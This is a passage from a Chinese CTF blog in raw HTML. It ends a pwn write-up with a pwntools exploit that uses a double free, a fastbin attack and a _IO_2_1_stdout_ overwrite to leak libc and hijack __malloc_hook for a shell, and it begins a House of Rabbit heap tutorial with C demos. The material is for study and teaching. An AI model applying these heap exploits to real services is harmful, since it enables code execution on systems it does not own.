class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5600</span></span><br><span class="line">	libc_realloc = libcbase + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">	malloc_hook = libcbase + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	one = libcbase + [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>][<span class="number">1</span>]</span><br><span class="line">	pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">	pr(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">	pr(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Double free + fastbin attack to get shell</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one)+p64(libc_realloc+<span class="number">13</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">global</span> p</span><br><span class="line">		p = process(<span class="string">&#x27;./sooooeasy&#x27;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&#x27;trying...&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接下来就来分析大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># over the “_IO_2_1_stdout - 0x43” (1/16)</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># chunk0</span></span><br><span class="line">add(<span class="number">0x90</span>) <span class="comment"># chunk1</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># chunk2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">_IO_2_1_stdout_s = libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] <span class="comment"># 覆写末尾3字节</span></span><br><span class="line">add(<span class="number">0x60</span>,p16((<span class="number">2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s-<span class="number">0x43</span>) &amp; <span class="number">0xFFF</span>))) <span class="comment"># chunk1_new</span></span><br></pre></td></tr></table></figure>
<p>delete(1) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x558b8a0970d0</span></span><br><span class="line"><span class="function">Size: 0xa1</span></span><br><span class="line"><span class="function">fd: 0x7f8d183d8b78</span></span><br><span class="line"><span class="function">bk: 0x7f8d183d8b78</span></span><br></pre></td></tr></table></figure>
<p>add(0x60,p16((2 &lt;&lt; 12) + ((_IO_2_1_stdout_s-0x43) &amp; 0xFFF))) 执行后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x558b8a0970d0</span> <span class="comment">// chunk_block1_new</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x558b8a097100 <span class="comment">// chunk_block1_new-&gt;name</span></span></span><br><span class="line"><span class="function">Size: 0x71</span></span><br><span class="line"><span class="function">fd: 0x7f8d183d8b78 <span class="comment">// 将会被覆写3字节(GDB似乎搞错了断点的位置,很奇怪)</span></span></span><br><span class="line"><span class="function">bk: 0x7f8d183d8b78</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x558b8a097100</span> <span class="comment">// 把断点打在后面,GDB才执行了这一步</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x558b8a097100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x558b8a097108</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x558b8a097110</span> ◂— <span class="number">0x7f8d183d0a30</span> <span class="comment">// 成功覆盖</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x558b8a097118</span> —▸ <span class="number">0x7f8d183d8b78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x558b8a097210</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>​        // GDB有时不能正确执行我们需要的指令，这里需要注意</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># Double free to leak libc_base</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">libcbase=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c5600</span></span><br><span class="line">libc_realloc = libcbase + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">malloc_hook = libcbase + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one = libcbase + [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>][<span class="number">1</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">pr(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">pr(<span class="string">&#x27;one&#x27;</span>,one)</span><br></pre></td></tr></table></figure>
<p>Double free 完成后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x564859f8a030</span> —▸ <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x564859f8a030</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x564859f8a030</span> <span class="comment">// chunk_block0-&gt;name</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564859f8a030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564859f8a038</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564859f8a040</span> —▸ <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564859f8a048</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x564859f8a1a0</span> <span class="comment">// chunk_block2-&gt;name</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x564859f8a1a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x564859f8a1a8</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x564859f8a1b0</span> —▸ <span class="number">0x564859f8a030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x564859f8a1b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">4</span> skipped</span><br></pre></td></tr></table></figure>
<p>接下来在申请了“chunk_block0-&gt;name”后，就可以在里面写写数据，从而改变“chunk_block2-&gt;name”的地址：（这里写入了“\x00”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span>: <span class="number">0x5602a27a71a0</span> —▸ <span class="number">0x5602a27a7030</span> —▸ <span class="number">0x5602a27a7100</span> ◂— <span class="number">0x7f1f0a9d25dd</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5602a27a7100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5602a27a7100</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5602a27a7108</span> ◂— <span class="number">0x71</span> <span class="comment">/* &#x27;q&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5602a27a7110</span> ◂— <span class="number">0x7f1f0a9d25dd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5602a27a7118</span> —▸ <span class="number">0x7f1f0a9ddb78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5602a27a7240</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5602a27a7120</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>接下来一直申请，就可以劫持到 <code>_IO_2_1_stdout_s</code> ，篡改 <code>_IO_2_1_stdout</code> 的 flags 为 “0x0FBAD1887” ，然后当程序调用 puts 输出任意信息时，就会输出 <code>_IO_write_base</code> 到 <code>_IO_write_ptr</code> 之间的数据，而这之间就有 libc 的指针</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># Double free + fastbin attack to get shell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(one)+p64(libc_realloc+<span class="number">13</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这次直接覆盖“malloc_hook-0x23”，下一次可以申请到“malloc_hook-0x23”</p>
<hr>
<p><strong>小结：</strong></p>
<p>本题目的难点就在于没有打印模块，需要利用 <code>_IO_2_1_stdout_</code> 的机制（这也是我第一次遇到通过 <code>_IO_2_1_stdout_</code> 来打印信息的题目，以后学一学），抛开这一点不谈，本题目还开放了一下我的“脑洞”：</p>
<ul>
<li>覆盖“main_arena+88”低地址来爆破“libc库函数”的操作（有House Of Roman的味道）</li>
<li>利用 Double free 间接插入“不确定地址”的操作（改变FD指向）</li>
<li>还有一种快速获取目标低地址的操作</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/12/House%20Of%20Rabbit-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/12/House%20Of%20Rabbit-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Rabbit-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-12 17:09:45" itemprop="dateCreated datePublished" datetime="2022-03-12T17:09:45+08:00">2022-03-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-06 14:42:10" itemprop="dateModified" datetime="2022-04-06T14:42:10+08:00">2022-04-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House Of Rabbit"></a>House Of Rabbit</h2><p>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中</p>
<p>核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化</p>
<p>利用点：我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出，而 house of rabbit 就利用了程序在 fastbin consolidate 的时候 ，没有对 size 进行检查</p>
<p>两种常见的利用手段：</p>
<ul>
<li>修改fastbin chunk的大小：直接构造 overlap chunk，通过 fastbin consolidate 使其合法化</li>
<li>修改FD指针：让 chunk-&gt;FD 指向一个 fake chunk，触发 fastbin consolidate 之后让这个 fake chunk 成为一个合法的 chunk（注意一下fake chunk的排列，不然会在consolidate时报错）</li>
</ul>
<hr>
<h2 id="House-Of-Rabbit-利用姿势"><a href="#House-Of-Rabbit-利用姿势" class="headerlink" title="House Of Rabbit 利用姿势"></a>House Of Rabbit 利用姿势</h2><p><strong>修改fastbin chunk的大小：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk4;</span><br><span class="line">       </span><br><span class="line">       <span class="built_in">free</span>(chunk1);</span><br><span class="line">       <span class="built_in">free</span>(chunk2);</span><br><span class="line">       chunk1[<span class="number">-1</span>]=<span class="number">0xa1</span>;</span><br><span class="line">       chunk4=<span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发fastbin合并</span></span><br><span class="line">       </span><br><span class="line">       chunk1[<span class="number">0</span>]=<span class="string">&quot;chunk1&quot;</span>;</span><br><span class="line">       chunk2[<span class="number">0</span>]=<span class="string">&quot;chunk2&quot;</span>;</span><br><span class="line">       chunk3[<span class="number">0</span>]=<span class="string">&quot;chunk3&quot;</span>;</span><br><span class="line">       chunk4[<span class="number">0</span>]=<span class="string">&quot;chunk4&quot;</span>;      </span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555555b000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555b000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555b008</span> ◂— <span class="number">0xa1</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555b010</span> —▸ <span class="number">0x555555556004</span> ◂— <span class="number">0x6300316b6e756863</span> <span class="comment">/* &#x27;chunk1&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555b018</span> —▸ <span class="number">0x7ffff7dd1c08</span> (main_arena+<span class="number">232</span>) —▸ <span class="number">0x7ffff7dd1bf8</span> (main_arena+<span class="number">216</span>) —▸ <span class="number">0x7ffff7dd1be8</span> (main_arena+<span class="number">200</span>) —▸ <span class="number">0x7ffff7dd1bd8</span> (main_arena+<span class="number">184</span>) ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555b020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55555555b040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x55555555b058</span> ◂— <span class="number">0x51</span> <span class="comment">/* &#x27;Q&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x55555555b060</span> —▸ <span class="number">0x55555555600b</span> ◂— <span class="number">0x6300326b6e756863</span> <span class="comment">/* &#x27;chunk2&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x55555555b068</span> —▸ <span class="number">0x7ffff7dd1bb8</span> (main_arena+<span class="number">152</span>) —▸ <span class="number">0x7ffff7dd1ba8</span> (main_arena+<span class="number">136</span>) —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">120</span>) —▸ <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">104</span>) ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x55555555b070</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x55555555b078</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55555555b080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55555555b0a0</span> ◂— <span class="number">0xa0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55555555b0a8</span> ◂— <span class="number">0x20</span> <span class="comment">/* &#x27; &#x27; */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x55555555b0b0</span> —▸ <span class="number">0x555555556012</span> ◂— <span class="number">0x6300336b6e756863</span> <span class="comment">/* &#x27;chunk3&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x55555555b0b8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│     <span class="number">0x55555555b0c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│     <span class="number">0x55555555b0c8</span> ◂— <span class="number">0x1011</span></span><br><span class="line"><span class="number">1</span>a:<span class="number">00</span>d0│ rax <span class="number">0x55555555b0d0</span> —▸ <span class="number">0x555555556019</span> ◂— <span class="number">0x100346b6e756863</span> <span class="comment">/* &#x27;chunk4&#x27; */</span></span><br><span class="line"><span class="number">1b</span>:<span class="number">00</span>d8│     <span class="number">0x55555555b0d8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>chunk1辐射的区域：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: <span class="number">0x55555555b000</span>+<span class="number">0xa0</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">93824992260256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: hex(<span class="number">93824992260256</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;0x55555555b0a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>chunk2辐射的区域：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: <span class="number">0x55555555b050</span>+<span class="number">0x50</span></span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">93824992260256</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: hex(<span class="number">93824992260256</span>)</span><br><span class="line">Out[<span class="number">10</span>]: <span class="string">&#x27;0x55555555b0a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>修改FD指针：</strong>（如果集齐了这些条件，打Double free肯定优于它）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk3;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>* chunk4;</span><br><span class="line"></span><br><span class="line">	chunk1[<span class="number">0</span>]=<span class="string">&quot;chunk1&quot;</span>;</span><br><span class="line">	chunk2[<span class="number">0</span>]=<span class="string">&quot;chunk2&quot;</span>;</span><br><span class="line">	chunk2[<span class="number">1</span>]=<span class="number">0x31</span>; <span class="comment">// fake chunk1-&gt;size 0x30</span></span><br><span class="line">	chunk2[<span class="number">7</span>]=<span class="number">0x21</span>; <span class="comment">// fake chunk2-&gt;size 0x20 </span></span><br><span class="line">	chunk2[<span class="number">11</span>]=<span class="number">0x21</span>; <span class="comment">// fake chunk3-&gt;size 0x20</span></span><br><span class="line">	<span class="comment">/* P位都必须为&#x27;1&#x27;(fastbin chunk的P位总是为&#x27;1&#x27;) */</span></span><br><span class="line">    <span class="comment">/* 其实这里这样操作不是为了绕过检查,而是为了防止consolidate时报错 */</span></span><br><span class="line">	<span class="built_in">free</span>(chunk1);</span><br><span class="line">	chunk1[<span class="number">0</span>]=chunk2;</span><br><span class="line">	   </span><br><span class="line">	chunk3=<span class="built_in">malloc</span>(<span class="number">5000</span>);</span><br><span class="line">	chunk4=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	chunk3[<span class="number">0</span>]=<span class="string">&quot;chunk3&quot;</span>;</span><br><span class="line">	chunk4[<span class="number">0</span>]=<span class="string">&quot;chunk4&quot;</span>;	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
